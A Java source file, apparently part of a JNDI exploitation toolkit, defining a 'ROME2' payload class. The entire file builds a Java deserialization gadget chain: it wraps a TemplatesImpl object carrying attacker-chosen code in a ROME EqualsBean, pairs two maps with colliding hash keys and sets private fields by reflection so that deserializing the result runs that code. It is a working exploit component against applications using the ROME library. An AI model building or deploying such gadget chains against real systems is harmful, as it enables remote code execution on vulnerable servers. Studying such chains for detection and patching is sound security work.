package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Map;

public class ROME2 implements ObjectPayload<Object> {
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        Object     o    = Gadgets.createTemplatesImpl(type, param);
        EqualsBean bean = new EqualsBean(String.class, "");

        Map map1 = Gadgets.createMap("aa", o);
        map1.put("bB", bean);

        Map map2 = Gadgets.createMap("aa", bean);
        map2.put("bB", o);

        Reflections.setFieldValue(bean, "_beanClass", Templates.class);
        Reflections.setFieldValue(bean, "_obj", o);

        return Gadgets.makeMap(map1, map2);
    }

}
